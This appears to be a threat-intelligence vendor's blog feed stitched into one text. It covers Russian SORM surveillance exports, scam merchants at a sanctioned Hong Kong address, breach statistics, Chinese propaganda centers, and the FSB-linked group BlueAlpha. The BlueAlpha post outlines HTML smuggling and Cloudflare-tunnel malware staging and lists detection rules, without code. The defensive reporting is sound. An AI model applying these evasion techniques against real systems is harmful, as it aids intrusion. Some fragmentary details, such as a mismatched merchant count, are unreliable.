        <p><em>Transcript: “When you share your story, a lot of people can identify with it. And therefore, you know, you break that barrier of fear that’s behind being authentically you. Hopefully, that’s been the results, you know, where people can feel like they can be authentic at work, where they can bring their culture, their traditions, and really help everybody learn about one another. When people feel like they belong, they’re more willing to be themselves. And when you’re yourself, you bring that authenticity which spreads like wildfire.</em></p>
        <p>This November, Futurists completed part two of the series - a practical and interactive session where they reflected on their paths, feelings, and vision for their year to come through that same notion and concept of authenticity and connection.</p>
        <p>We talked to them to understand their experiences and takeaways following the “Creating Your Limitless Life” workshop!</p>
        <p>“I found the Collective Power event to be a valuable opportunity to share and learn practical strategies for life management. Hearing about the positive goals others have set was inspiring, and it was encouraging to explore new approaches to achieve those goals. Overall, the experience was both enlightening and up-lifting.” - Peter Barry, Office Operations Coordinator - Somerville</p>
        <p>“The Collective Power series was the most impactful self-reflection exercise I've had the privilege to experience. The facilitators were awesome in sparking conversations where we felt comfortable sharing both personal and professional development ideas. I now have a true understanding of what I accomplished in 2024, and manageable expectations for myself and others in 2025.” - Kim Stone, Sr. Program Manager, Customer Success</p>
        <p>“I found the Collective Power series to be empowering and enabling. It was reassuring to meet with other coworkers who are dealing with obstacles that life throws at them and hearing how everyone is coping and thriving despite those challenges. I learned resilience techniques and felt encouraged and less alone as a result. It was a great way to connect on a human level with my coworkers.” - Charity Wright, Principal Threat Intelligence Consultant</p>

          <img loading="lazy" alt="insikt-group-logo-updated-3-300x48.png" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Summary:</h2>
        <p>Several countries in Central Asia and Latin America almost certainly base their digital surveillance capabilities on Russia’s System for Operative Investigative Activities (SORM), indicating that Russian surveillance technology has proliferated in Russia’s near abroad and among its allies. Insikt Group identified evidence of at least eight SORM providers exporting to these regions, with at least fifteen telecommunications companies as likely customers. The largest Russian SORM providers like Citadel, Norsi-Trans, and Protei, export and participate in trade expositions across Africa, Latin America, and the Middle East, highlighting efforts to further expand globally. While these systems have legitimate security applications, the governments outlined in this report have a history of misusing surveillance capabilities , including repression of political opposition, journalists, and activists, without effective or independent oversight. SORM facilitates interception of a wide range of internet and telecommunications traffic by authorities without the knowledge of the service providers themselves, reducing transparency and oversight of surveillance operations and increasing opportunities for abuse. Companies operating in or looking to establish physical operations in these countries should assess surveillance risks and adopt privacy tools like encryption and VPNs –– to the extent permitted by local law –– to mitigate sensitive communications being intercepted.</p>
        <h2>What is SORM?</h2>
        <p><a href="/blog/russia-ukraine-cyber-front">Russia’s SORM</a> underpins the <a href="https://go.recordedfuture.com/hubfs/reports/cta-2021-0909.pdf">Russian Federation’s electronic surveillance apparatus</a>, which involves all telecommunications and ISP companies installing monitoring equipment under strict government oversight. Security and intelligence services gain direct access to telecommunications traffic passing through the installed equipment, bypassing service providers, who are not authorized to access information regarding interceptions. SORM has evolved from intercepting landline and mobile communications to monitoring internet traffic, Wi-Fi, and social media, with the latest iteration (SORM-3) enabling the collection and long-term storage of traffic and subscriber metadata in a searchable database. This system allows law enforcement authorities and security services to filter data by identifiers such as phone numbers, geolocations, IP addresses, and usernames, all supported by legal frameworks mandating compliance. The nature of SORM’s integration into telecommunications and internet infrastructure facilitates potential interception and reduces visibility into surveillance operations, raising the risk of abuse, especially in countries with limited or nonexistent oversight.</p>
        <h2>Risk of Russian Government Access</h2>
        <p>Foreign deployments of SORM-based surveillance systems using Russian-manufactured components likely entail a risk of Russian access, given the close ties between SORM providers and the Russian government and the likely high value of information intercepted via these systems. Previous cases, such as the suspected exploitation of Kaspersky exports, support the assessment that Moscow can likely access exported SORM technologies. In <a href="https://www.bis.gov/press-release/commerce-department-prohibits-russian-kaspersky-software-us-customers">June 2024</a>, the US Department of Commerce’s Bureau of Industry and Security (BIS) prohibited Kaspersky Lab from providing technologies and services in the US or to US persons, citing several factors of "unacceptable" risk to national security. Similar concerns apply to SORM providers, such as Citadel, which has been tied to Russian security services, specifically the Federal Security Service (FSB), and oligarchs close to President Vladimir Putin. Citadel’s major role in the consolidation of the Russian SORM market also underscores likely connections to the Russian government. Notably, Kazakhstan and Kyrgyzstan have raised concerns about backdoors in SORM equipment, with evidence suggesting that Russian manufacturers maintained access to systems deployed abroad.</p>
        <h2>Mitigations</h2>
        <p>Companies operating in countries using SORM-based systems should mitigate the risk of interception by securing online communications with reputable encryption tools, avoiding services on hosting providers with top-level domains of these countries, limiting or removing access to sensitive corporate data during travel, and conducting comprehensive assessments of state digital and physical surveillance capabilities, focusing on evidence of malign misuse against business travelers.</p>
        <p>In this report, Insikt Group has provided a list of indicators that companies can use to assess data privacy and surveillance risk in the context of SORM. While none of these factors guarantee a country uses SORM, the presence of several indicators is indicative of a higher state surveillance risk, including imports from known Russian SORM providers, legislation requiring the installation of interception technologies akin to SORM, joint telecommunications projects with Russian SORM providers, state control over telecommunications infrastructure, reports of intrusive or malign surveillance, and restrictions on encryption technologies. <a href="/products/geopolitical-intelligence">Recorded Future’s Country Risk feature</a> offers regularly updated analysis and mitigation guidance for assessing such risks.</p>
        <h2>Outlook</h2>
        <p>The marketing materials and trade show participation of major SORM providers suggest that these organizations will very likely continue to seek opportunities for foreign expansion. Countries with close ties to Russia — especially those with histories of cybersecurity or intelligence cooperation or joint projects in the telecommunications sphere — will likely continue to source digital surveillance components from Russian providers. SORM deployments in these regions will almost certainly continue to present data security risks, particularly where oversight of government surveillance is weak. More broadly, the export of Russian surveillance technologies will continue to offer Moscow opportunities to expand its influence, particularly in its "near abroad", and potentially enhance intelligence collection capabilities, though the degree of potential access is unclear.</p>

            <content:encoded><![CDATA[
        <p><strong><em>Editor's note: The following blog post originally appeared on</em></strong> <strong><em><a href="https://intelligence2risk.substack.com/">Levi Gundert's Substack page</a>.</em></strong></p>
        <p>
          <img loading="lazy" alt="fraud-funding-image4.png" src="https://www.recordedfuture.com/media_1c2486e757c68cd2dbcb29bd4f1e292185ba942ec.png?width=750&amp;format=png&amp;optimize=medium" width="1024" height="1024" />
        </p>
        <h2>Introduction</h2>
        <p>A past conversation with an undercover federal agent who specializes in money laundering revealed staggering amounts of currency moving across geographic boundaries, skirting traditional Anti-Money Laundering (AML) processes. From local and transnational crime syndicates to presidential spouses and those looking to evade sanctions or tax regimes, the need to wash and move illicit funds into reputable banking channels has never been greater.</p>
        <p>The FT’s recent AML coverage highlights the scale of the problem and provides timely <a href="https://www.ft.com/search?q=money+laundering">background reading</a> on money laundering networks, suspects, and indictments. One <a href="https://www.ft.com/content/db1fa3d5-ebe7-4612-b8b2-d4ea3f1e1027">story</a> is particularly relevant as it centers around proof of address compliance failures. Coincidentally, address verification is precisely the problem highlighted by a recent Recorded Future Payment Fraud Intelligence (PFI) report.</p>
        <h2>Big Fraud and a Hong Kong Address</h2>
        <p>The address in question is: <em>12th Floor, San Toi Building,137-139</em> <em>Connaught Road Central, Hong Kong</em></p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="fraud-funding-image2.png" src="https://www.recordedfuture.com/media_16db45d86d424383300f888c0f6d0a754bd7e2966.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="1300" />
            </div>
          </div>
          <div>
            <div><em>The San Toi Building (and 12th-floor visual estimate) provided by Google Maps</em></div>
          </div>
        </div>
        <p>The address is linked to two scam website (fraud) clusters—designated “Misspelled” and “Brand as a Cover”—which share merchant accounts and payment processing logic. The three merchant accounts include “‘CAMHUBSTORE’, ‘AQAPAY*xmvmxft,’ ‘SMARTTECHHK,’ and ‘gracefashionhub.’” Hundreds, if not thousands, of scam websites are connected to these merchants.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="fraud-funding-image1.jpg" src="https://www.recordedfuture.com/media_136cf94342c0eaf4ea8cc4b6ac8f56038cc9aa474.jpg?width=750&amp;format=jpg&amp;optimize=medium" width="1406" height="1121" />

          <div>
            <div><em>A scam website snapshot.</em></div>
          </div>
        </div>

          <div>

              <img loading="lazy" alt="fraud-funding-image5.jpg" src="https://www.recordedfuture.com/media_150a695e79a1f91663676ddeee3a6b927e277def0.jpg?width=750&amp;format=jpg&amp;optimize=medium" width="1334" height="1381" />

          <div>
            <div><em>A victim articulates why Camhubstore is a scam site.</em></div>
          </div>
        </div>
        <p>These merchant accounts that process payments for fraudulent, non-existent goods are tied to the 12th floor of the San Toi Building as the registered business address. The address is even placed directly on some of the sites as a contact address. Here’s where it gets interesting. The address is listed on the <a href="https://sanctionssearch.ofac.treas.gov/Details.aspx?id=46352">U.S. Treasury OFAC list</a> for ties to an <a href="https://home.treasury.gov/news/press-releases/jy1932">Iranian terrorism group</a>.</p>
        <p>The 12th floor is presumably large enough to house <a href="https://www.importyeti.com/supplier/fenglong-art">multiple businesses</a> and likely sufficiently small such that <a href="https://www.importyeti.com/addresses/supplier/12-f-san-toi-building-137-139-connaught-road-central">businesses transit through</a> reasonably often. Of course, it would be difficult to draw a direct connection between these merchant accounts and terrorism based on a shared space address. Still, other questions remain, namely: how are these scam merchants acquiring the ability to process payment cards when their physical address is on the OFAC list?</p>
        <h2>Remedying AML / KYC Compliance Failures</h2>
        <p>Knowing your customer (KYC) might be difficult when bad actors go to great lengths to obscure their identity and purpose, but this is an egregious case of acquiring banks and payment processors missing obviously <a href="https://offshoreleaks.icij.org/nodes/292373?e=true">problematic</a> contact details.</p>
        <p>Geoff White’s book, <em><a href="https://www.amazon.com/Lazarus-Heist-Based-hit-podcast/dp/0241554276/">The Lazarus Heist</a></em><a href="https://www.amazon.com/Lazarus-Heist-Based-hit-podcast/dp/0241554276/">, documented that even routine checks can lead to better outcomes</a>. In it, White details North Korean hackers' inability to transfer a more significant amount (hundreds of millions of dollars) from Bangladesh Bank to a bank branch in Manila because the branch is located on Jupiter Street, and "Jupiter” is also the name of a sanctioned Iranian shipping vessel. Addresses matter.</p>
        <p>Suppose the US <a href="https://www.wsj.com/finance/currencies/crypto-banks-relationship-trump-administration-414ff706">pursues a more friendly regulatory environment</a> for cryptocurrencies under President Trump, and exchanges find it easier to acquire bank accounts. In that case, the <a href="https://intelligence2risk.substack.com/p/from-crypto-to-fiat-sneaky-ways-cybercriminals">potential for money laundering</a> may explode without rigorous AML / KYC / KYT efforts. The SEC may have fewer teeth, but banks and processors are still gambling if anyone can obtain a merchant account with little to no compliance checks.</p>
        <p>Indeed, the business incentives are aligned to offer maximum merchant accounts to generate more processing fees, and historically, compliance costs have eroded profitability. However, this may be an emerging opportunity for GenAI. Semi-autonomous agents trained to flag basic AML violations (for example, website contact details listed on OFAC, perhaps) and elastic agents that deploy on demand when a new merchant application is submitted would assist AML compliance efforts and help the financial services industry grappling with a tsunami of fraudulent merchant transactions.</p>

            <description><![CDATA[Discover the rising costs of data breaches, including disruption, legal risks, and lost trust. Learn proactive steps to protect your business from escalating threats.]]></description>
            <content:encoded><![CDATA[
        <p>Recorded Future’s Insikt Group identified a 76% increase in publicly reported data breaches from 2022 to 2023. While 2024 data is not yet complete, Recorded Future data on validated data breaches project a further 5% increase in 2024 compared to 2023. The scale of this increase in the past two years invites a sense of urgency and concern, especially when the attack surface for data breaches is moving further out of companies’ control. Based on what we can measure, the costliest impacts of data breaches in the last several years have been operational disruption, legal risks, and declining sales due to churn and loss of customer trust. However, the real risk lies in companies falling behind in their security strategy and failing to adopt a new way of thinking. Our immediate and long-term solutions provide a starting point for effectively addressing this escalating threat.</p>
        <h2>Data Breaches Are on the Rise</h2>
        <ul>
          <li>The industries most affected by the 76% increase in data breaches in 2023 were the healthcare, finance, information technology and software, insurance, and manufacturing sectors.</li>
          <li>The insurance sector saw the largest increase in reported data breaches in 2023, with a 178% increase. This was followed by healthcare with a 107% increase and manufacturing with an 81% increase. The sensitivity of these industries’ data and the cost of disruption to their operations have likely been driving factors for threat actors to target these industries.</li>
        </ul>

          </div>
        </div>
        <h2>The Costs of Data Breaches Continue to be High</h2>
        <ul>
          <li>Research from <a href="https://www.ibm.com/reports/data-breach">IBM shows</a> that the average total cost of a data breach “reached an all-time high in 2024 of USD 4.88 million”.</li>
          <li>The business impacts of data breaches are often easiest to measure right after a breach is detected, such as the four-day outage at an Australian personal loan provider in early 2023 that <a href="https://investors.latitudefinancial.com.au/DownloadFile.axd?file=/Report/ComNews/20230316/02644401.pdf">resulted</a> in what we estimate could have been a revenue disruption of over $6 million USD while security teams mitigated the breach.</li>
          <li>However, impacts can also linger: In Q4 of 2023, after a US genetics testing company confirmed it had been hit by a major data breach, it saw <a href="https://investors.23andme.com/news-releases/news-release-details/23andme-reports-fy2023-fourth-quarter-and-full-year-financial">decreased sales</a> and <a href="https://www.google.com/finance/quote/.IXIC:INDEXNASDAQ?window=1Y&amp;comparison=NASDAQ%3AME">underperformed</a> the Nasdaq by approximately 16%. While it was not the only factor at play, the negative media coverage around the data breach is highly likely to have played a role in stock, sales, and revenue underperformance, especially when considered in the context of the <a href="https://connect.sustainalytics.com/hubfs/INV/Thought%20Leadership/Sustainalytics_The%20Impact%20of%20Cyberattacks%20on%20Stock%20Prices_Sep%202022.pdf">extensive</a> <a href="https://www.ibm.com/reports/data-breach">literature indicating</a> how cyberattacks can negatively impact stock prices.</li>
        </ul>
        <h2>The Causes Are Moving Further Out Of Control</h2>
        <ul>
          <li>As the costs of a data breach increase, the causes of breaches are also moving further out of organizations’ control. Companies may have robust vulnerability remediation on their infrastructure and devices, but threat actors are increasingly looking for vulnerabilities in third-party software to gain access to more potential victims1. Third-party software providers are critical components of the software supply chain and may not have effectively identified or addressed these vulnerabilities. This lack of remediation exposes the entire ecosystem to heightened risks of compromise, as reliance on <a href="/outcomes/supply-chain">third-party software expands the attack surface</a>.</li>
          <li>As more and more data is likely hosted on third-party cloud providers, threat actors are abusing exposed administrative accounts (<a href="https://attack.mitre.org/techniques/T1078/">Valid Accounts</a>) to gain privileged access and exfiltrate data more effectively. Recorded Future’s 2023 Annual Report <a href="/research/2023-annual-report">highlighted</a> a 22% increase in validated cyberattacks leveraging the Valid Accounts technique. Based on initial analysis of 2024 data, threat actors continue to abuse valid accounts at various stages of an attack sequence—such as discovery, privilege escalation, and defense evasion—to facilitate data theft. These accounts enable lateral movement within networks to access sensitive systems, facilitate reconnaissance by appearing as normal user activity, and help blend into regular traffic to avoid triggering security alerts.</li>
        </ul>
        <h2>Getting Ahead of the Problem</h2>
        <p>One immediate action security teams can take to improve their organization’s risk profile is to create a vendor catalog to identify all external parties with access to company data. Use of risk management software, such as Recorded Future’s <a href="https://go.recordedfuture.com/hubfs/data-sheets/third-party-intelligence.pdf">Third-Party Intelligence Module</a>, enables extended visibility across the entire third-party ecosystem to uncover risk exposures and prioritize risk mitigation.</p>
        <p>More long-term actions can also be helpful in mitigating the chances or severity of a data breach:</p>
        <ul>
          <li><a href="https://www.immuta.com/blog/what-is-data-tokenization/">Tokenization</a> or encryption helps to render sensitive data meaningless or inaccessible, respectively, outside of a secure environment. Organizations can reduce exposure to risks associated with storing sensitive data and maintain compliance with data privacy laws and regulations by implementing the appropriate method. An audit of necessary tasks associated with data, and not just the sensitivity of data itself, can help with applying the principle of least privilege effectively.</li>
          <li>Close collaboration between multiple teams – forensics, incident response, and legal and compliance – can more successfully manage the fallout from potential data breaches. If these teams do not already have a good working relationship, chances are low that they will automatically have one in response to a severe and public data breach. As a result, it is a good idea for these teams to know each other well outside of a crisis.</li>

        </p>
        <h2>Summary</h2>
        <p>China is rapidly advancing its global propaganda strategies through international communication centers (ICCs), with over 100 centers established since 2018 — most since 2023. These centers aim to amplify the Chinese Communist Party's (CCP) voice on the international stage, <a href="/blog/elephants-street-dance-chinese-communist-party-appeal-youth-overseas-propaganda">targeting specific audiences</a> with tailored messaging (a strategy known as “precise communication”). ICCs coordinate local, national, and international resources to build China's image, share political narratives, and promote economic partnerships.</p>
        <p>By leveraging inauthentic social media amplification, foreign influencers, and collaborations with overseas media, ICCs advance <a href="/research/china-propaganda-targets-bbc-uk">China’s multi-layered propaganda</a> approach. For instance, Fujian's ICC reportedly manages TikTok accounts targeting Taiwanese audiences, likely including a covert account that is highly critical of the Taiwan government called Two Tea Eggs. On YouTube, the same ICC promotes videos of Taiwanese individuals praising China. These centers are strategically positioned to promote China's interests during geopolitical crises, despite challenges like limited credibility and resource constraints.</p>
        <h2>Breaking the Circle: Chinese Communist Party Propaganda Infrastructure Rapidly Expands</h2>
        <p><a href="/blog/chinas-narrative-war-democracy">China's efforts to reshape global narratives</a> about its policies, culture, and geopolitical aims have reached new heights with the rapid proliferation of international communication centers (ICCs). Established to amplify the voice of the Chinese Communist Party (CCP), these centers are integral to <a href="/research/1-key-for-1-lock-chinese-communist-party-strategy-targeted-propaganda">China's global propaganda apparatus</a> and seek to propel the CCP’s “precise communication” strategy for targeting distinct audiences. Here’s a closer look at their functions, strategies, and implications.</p>
        <h2>What Are ICCs?</h2>
        <p>ICCs are propaganda hubs designed to bring new resources to the CCP’s efforts to “tell China’s story” by centralizing and streamlining the capabilities of provinces, cities, and smaller jurisdictions. These centers focus on building China's global image by sharing positive narratives about its culture, economy, and development. Simultaneously, they act as a conduit for political narratives aimed at countering negative perceptions and promoting China's geopolitical agenda.</p>
        <p>Over 100 ICCs have been established across China, primarily since 2023, under provincial and sub-provincial propaganda departments and state media organizations. These centers aim to "break the circle" to penetrate foreign audiences and tailoring content for specific regions and demographics.</p>
        <h2>Key Objectives of ICCs</h2>
        <p>ICCs primarily aim to promote positive narratives about China. They create content that highlights the country’s cultural heritage, technological innovations, and economic progress, fostering goodwill among international audiences. Additionally, ICCs counter negative narratives by responding to perceived anti-China sentiments and disseminating content to influence public opinion on geopolitical topics. By tailoring their approaches to specific regions and demographics, ICCs strive to ensure their narratives resonate more effectively. For example, Fujian’s ICC specifically targets Taiwanese audiences using TikTok accounts that blend cultural themes with critical political messaging.</p>
        <h2>Tactics and Strategies</h2>
        <p>ICCs employ various tactics to achieve their objectives. <a href="/research/china-social-media-operations">Social media operations form a core component of their strategy</a>, with thousands of accounts active across platforms like Facebook, YouTube, and TikTok. Many of these accounts lack transparency about their state affiliations, enabling covert influence campaigns. Additionally, ICCs leverage foreign influencers and “communication officers” to amplify China’s narratives through user-generated content, vlogs, and experiential propaganda.</p>
        <p>Collaboration with overseas media organizations further enhances ICCs' reach and legitimacy. Through actions like organizing foreign journalist visits to China, ICCs create an impression of organic coverage and offer an alternative to Western narratives. These partnerships — reportedly established in Australia, Brazil, Cambodia, Egypt, France, Japan, Russia, the United States, and elsewhere — are complemented by localized propaganda activities that align with China’s economic and geopolitical interests. S</p>
        <h2>Challenges to Success</h2>
        <p>Despite ambitious goals, ICCs face significant challenges that hinder their effectiveness. These include a lack of professional and foreign talent, insufficient discourse power, inadequate data for precise communication, and inconsistent funding. ICCs often struggle to translate local developments into effective narratives for foreign audiences and lack focus on target demographics. Many rely heavily on central state media infrastructure, as seen with the Nanning International Communication Center outsourcing key operations to Xinhua News Agency. These limitations echo long-standing issues within China's state media sector.</p>
        <h2>Implications</h2>
        <p>ICCs represent a sophisticated evolution in China's propaganda efforts. While they are unlikely to become trusted sources of information in the near term, their ability to amplify preferred narratives during geopolitical crises is likely significant. These centers likely have the potential to influence foreign opinion of China by offering regular engagement, providing alternatives to Western sources, and focusing on topics like quality of life in China rather than political values, especially among Global South and Western periphery audiences.</p>
        <h2>Outlook</h2>
        <p>The expansion of international communication centers (ICCs) reflects China's ongoing efforts to innovate its media strategy, centralize resources, and project global narratives favoring its interests under Xi Jinping's leadership. Despite challenges, ICCs likely strengthen China's ability to influence global discourse by leveraging thousands of overt and covert social media accounts and fostering collaborations with foreign media. These centers could amplify assertive messaging during crises and suppress negative coverage of China.</p>
        <p>China's long-term goal is almost certainly to establish ICC-affiliated platforms as trusted sources of information. While this remains unlikely in the near term due to credibility challenges, ICCs represent a strategic step toward improving China’s external propaganda system. Researchers and governments should prioritize tracking ICC activities and advocating for transparent labeling of their state affiliations on social media platforms.</p>

        </p>
        <h2>Summary</h2>
        <p><a href="/blog/bluealpha-iranian-apts">BlueAlpha</a> is a state-sponsored cyber threat group operating under the directive of the Russian Federal Security Service (FSB) that overlaps with the publicly reported groups Gamaredon, Shuckworm, Hive0051, and UNC530. BlueAlpha has been active since at least 2014 and continues to target Ukrainian organizations through relentless spearphishing campaigns to distribute custom malware. Since at least October 2023 BlueAlpha has delivered the custom VBScript malware GammaLoad, enabling data exfiltration, credential theft, and persistent access to compromised networks.</p>
        <h2>BlueAlpha Abuses Cloudflare Tunneling Service for GammaDrop Staging Infrastructure</h2>
        <p>BlueAlpha has recently evolved its malware delivery chain to now leverage Cloudflare Tunnels for staging GammaDrop malware, a tactic popularized by cybercriminal threat groups to deploy malware.</p>
        <h2>Key Findings:</h2>
        <ol>
          <li>BlueAlpha uses Cloudflare Tunnels to conceal its GammaDrop staging infrastructure, evading traditional network detection mechanisms.</li>
          <li>The group delivers malware through HTML smuggling, leveraging sophisticated techniques to bypass email security systems.</li>
          <li><a href="https://go.recordedfuture.com/hubfs/reports/cta-2021-0112.pdf">DNS fast-fluxing</a> complicates efforts to track and disrupt command-and-control (C2) communications.</li>
        </ol>
        <h2>How BlueAlpha Exploits Cloudflare Tunnels</h2>
        <p>Cloudflare offers the tunneling service for free with the use of the TryCloudflare tool. The tool allows anyone to create a tunnel using a randomly generated subdomain of trycloudflare.com and have all requests to that subdomain proxied through the Cloudflare network to the web server running on that host. BlueAlpha leverages this to conceal staging infrastructure used to deploy GammaDrop.</p>
        <h2>HTML Smuggling</h2>
        <p>HTML smuggling enables malware delivery through embedded JavaScript in HTML attachments. BlueAlpha has refined this method with subtle modifications to avoid detection. Recent samples show changes in deobfuscation methods, such as using the onerror HTML event to execute malicious code.</p>
        <h2>GammaDrop and GammaLoad Malware</h2>
        <p>BlueAlpha’s malware suite is central to its campaigns:</p>
        <ul>
          <li>GammaDrop: acts as a dropper, writing GammaLoad to disk and ensuring persistence</li>
          <li>GammaLoad: a custom loader capable of beaconing to its C2 and executing additional malware</li>
        </ul>
        <p>BlueAlpha uses obfuscation techniques, namely extensive amounts of junk code and random variable names to complicate analysis.</p>
        <h2>Mitigation Strategies</h2>
        <ol>
          <li>Enhance Email Security: Deploy solutions to inspect and block HTML smuggling techniques. Flag attachments with suspicious HTML events like onerror.</li>
          <li>Restrict Execution of Malicious Files: Implement application control policies to block malicious use of mshta.exe and untrusted .lnk files.</li>
          <li>Monitor Network Traffic: Set up rules to flag requests to <em>trycloudflare.com</em> subdomains and unauthorized DNS-over-HTTPS (DoH) connections.</li>
          <li>Leverage Threat Intelligence: Use Recorded Future’s Malware mitigation solution to analyze suspicious files and stay informed about emerging threats.</li>
        </ol>
        <h2>Outlook</h2>
        <p>BlueAlpha’s continued use of legitimate services like Cloudflare demonstrates its commitment to refining evasion techniques. Organizations must stay vigilant and invest in advanced detection and response capabilities to counter these sophisticated threats.</p>
